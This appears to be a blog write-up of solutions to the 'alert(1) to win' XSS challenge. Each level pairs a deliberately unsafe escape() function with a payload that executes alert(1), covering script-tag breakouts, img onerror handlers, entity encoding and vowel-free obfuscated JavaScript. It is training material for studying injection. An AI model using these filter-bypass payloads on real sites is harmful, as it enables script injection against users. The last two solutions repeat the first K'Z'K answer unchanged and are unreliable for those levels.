---
layout: single
title: alert(1) to win by steike
date: 2021-05-19
classes: wide
tags:
  - alert(1)
  - XSS
  - Challenge
  - steike
---

The code below generates HTML in an unsafe way. Prove it by calling alert(1).
 
## Challenges

- [Warmup](#warmup)
- [Adobe](#adobe)
- [JSON](#json)
- [Markdown](#markdown)
- [DOM](#dom)
- [Skandia](#skandia)
- [JSON2](#json2)
- [Well](#well)
- [No](#no)
- [K'Z'K](#kzk)
- [K'Z'K 2](#kzk2)
- [K'Z'K 3](#kzk3)

## Warmup

- The code below generates HTML in an unsafe way. Prove it by calling alert(1).


```
function escape(s) {
  return '<script>console.log("'+s+'");</script>';
}
```

- Input

```
",alert(1),"
```

- Output

```
<script>console.log("",alert(1),"");</script>
```

## Adobe

- The code below generates HTML in an unsafe way. Prove it by calling alert(1).

```
function escape(s) {
  s = s.replace(/"/g, '\\"');
  return '<script>console.log("' + s + '");</script>';
}
```

- Input

```
\");alert(1)//
```

## JSON

- The code below generates HTML in an unsafe way. Prove it by calling alert(1).

```
function escape(s) {
  s = JSON.stringify(s);
  return '<script>console.log(' + s + ');</script>';
}
```

- Input

```
</script><script>alert(1)//
```

## Markdown

- The code below generates HTML in an unsafe way. Prove it by calling alert(1).

```
function escape(s) {
  var text = s.replace(/</g, '&lt;').replace(/"/g, '&quot;');
  // URLs
  text = text.replace(/(http:\/\/\S+)/g, '<a href="$1">$1</a>');
  // [[img123|Description]]
  text = text.replace(/\[\[(\w+)\|(.+?)\]\]/g, '<img alt="$2" src="$1.gif">');
  return text;
}
```

- Input

```
[[x|http://onerror=javascript:alert(1)//]]
```

## DOM

- The code below generates HTML in an unsafe way. Prove it by calling alert(1).

```
function escape(s) {
  // Slightly too lazy to make two input fields.
  // Pass in something like "TextNode#foo"
  var m = s.split(/#/);

  // Only slightly contrived at this point.
  var a = document.createElement('div');
  a.appendChild(document['create'+m[0]].apply(document, m.slice(1)));
  return a.innerHTML;
}
```

- Solution

```
Comment#--><img src onerror=alert(1)
```

- HTML source

```
<!----><img src onerror=alert(1)-->
```

## Skandia

- The code below generates HTML in an unsafe way. Prove it by calling alert(1).

```
function escape(s) {
  return '<script>console.log("' + s.toUpperCase() + '")</script>';
}
```

- Solution

```
</script><img src onerror=&#x61;&#x6C;&#x65;&#x72;&#x74;(1)>
```

## JSON2

- The code below generates HTML in an unsafe way. Prove it by calling alert(1).

```
function escape(s) {
  s = JSON.stringify(s).replace(/<\/script/gi, '');

  return '<script>console.log(' + s + ');</script>';
}
```

- Solution

```
</scrip</scriptt><script>alert(1)//
```

## Well

- The code below generates HTML in an unsafe way. Prove it by calling alert(1).

```
function escape(s) {
  http://www.avlidienbrunn.se/xsschallenge/

  s = s.replace(/[\r\n\u2028\u2029\\;,()\[\]<]/g, '');
  return "<script> var email = '" + s + "'; <\/script>";
}
```

- Solution

```
'+Function`a${`alert${Function`a${`return fromCharCode`}{fromCharCode}``${String}``40`}1${Function`a${`return fromCharCode`}{fromCharCode}``${String}``41`}`}```+'
```


## No

- The code below generates HTML in an unsafe way. Prove it by calling alert(1).

```
// submitted by Stephen Leppik

function escape(s) {
    s = s.replace(/[()`<]/g, ''); // no function calls

    return '<script>\n' +
           'var string = "' + s + '";\n' +
           'console.log(string);\n' +
           '</script>';
}
```

- Solution

```
";string=1;console.log=alert//
```

- Output

```
<script>
var string = "";string=1;console.log=alert//";
console.log(string);
</script>
```

## K'Z'K

- The code below generates HTML in an unsafe way. Prove it by calling alert(1).


```
// submitted by Stephen Leppik
function escape(s) {
    // remove vowels in honor of K'Z'K the Destroyer
    s = s.replace(/[aeiouy]/gi, '');
    return '<script>console.log("' + s + '");</script>';
}
```

- Solution

```
"+[]['p'+[CSS+''][0][1]+'p']['c'+[CSS+''][0][1]+'nstr'+[CSS[0]+''][0][0]+'ct'+[CSS+''][0][1]+'r']([CSS*CSS+''][0][1]+'l'+[CSS[0]+''][0][3]+'rt(1)')()+"
```

- Output

```
<script>console.log(""+[]['p'+[CSS+''][0][1]+'p']['c'+[CSS+''][0][1]+'nstr'+[CSS[0]+''][0][0]+'ct'+[CSS+''][0][1]+'r']([CSS*CSS+''][0][1]+'l'+[CSS[0]+''][0][3]+'rt(1)')()+"");</script>
```

## K'Z'K 2

- The code below generates HTML in an unsafe way. Prove it by calling alert(1).


```
// submitted by Stephen Leppik
function escape(s) {
    // remove vowels and escape sequences in honor of K'Z'K 
    // y is only sometimes a vowel, so it's only removed as a literal
    s = s.replace(/[aeiouy]|\\((x|u00)([46][159f]|[57]5)|1([04][15]|[15][17]|[26]5))/gi, '')
    // remove certain characters that can be used to get vowels
    s = s.replace(/[{}!=<>]/g, '');
    return '<script>console.log("' + s + '");</script>';
}
```

- Solution

```
"+[]['p'+[CSS+''][0][1]+'p']['c'+[CSS+''][0][1]+'nstr'+[CSS[0]+''][0][0]+'ct'+[CSS+''][0][1]+'r']([CSS*CSS+''][0][1]+'l'+[CSS[0]+''][0][3]+'rt(1)')()+"
```

- Output

```
<script>console.log(""+[]['p'+[CSS+''][0][1]+'p']['c'+[CSS+''][0][1]+'nstr'+[CSS[0]+''][0][0]+'ct'+[CSS+''][0][1]+'r']([CSS*CSS+''][0][1]+'l'+[CSS[0]+''][0][3]+'rt(1)')()+"");</script>
```

## K'Z'K 3

- The code below generates HTML in an unsafe way. Prove it by calling alert(1).


```
// submitted by Stephen Leppik
function escape(s) {
    // remove vowels in honor of K'Z'K the Destroyer
    s = s.replace(/[aeiouy]/gi, '');
    return '<script>console.log("' + s + '");</script>';
}
```

- Solution

```
"+[]['p'+[CSS+''][0][1]+'p']['c'+[CSS+''][0][1]+'nstr'+[CSS[0]+''][0][0]+'ct'+[CSS+''][0][1]+'r']([CSS*CSS+''][0][1]+'l'+[CSS[0]+''][0][3]+'rt(1)')()+"
```

- Output

```
<script>console.log(""+[]['p'+[CSS+''][0][1]+'p']['c'+[CSS+''][0][1]+'nstr'+[CSS[0]+''][0][0]+'ct'+[CSS+''][0][1]+'r']([CSS*CSS+''][0][1]+'l'+[CSS[0]+''][0][3]+'rt(1)')()+"");</script>
```